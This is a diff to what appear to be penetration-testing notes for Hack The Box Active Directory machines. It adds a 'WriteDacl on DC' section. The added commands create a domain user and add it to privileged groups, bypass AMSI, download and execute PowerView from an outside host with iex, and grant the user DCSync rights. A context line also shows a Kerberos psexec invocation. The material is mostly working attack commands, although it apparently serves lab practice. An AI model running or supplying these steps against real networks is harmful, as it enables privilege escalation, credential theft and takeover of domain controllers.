@@ -80,8 +80,20 @@ impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.x.x
 ```
 
 # WriteDacl on DC
+- The WriteDACL privilege gives a user the ability to add ACLs to an object
+- This means that we can add a user to this group and give them DCSync privileges.
+  
 ```bash
-$SecPassword = ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('HTB.local\pwnt', $SecPassword)
-Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity pwnt -Rights DCSync
+# First add a user
+net user john abc123! /add /domain
+net group "Eschange Windows Permissions" john /add
+net localgroup "Remote Management Users" john /add
+
+# Download powerview
+Bypass-4MSI
+iex(new-object net.webclient).downloadstring('http://10.10.10.161/PowerView.ps1')
+
+$SecPassword = ConvertTo-SecureString 'abc123!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('HTB.local\john', $SecPassword)
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity john -Rights DCSync
 ```
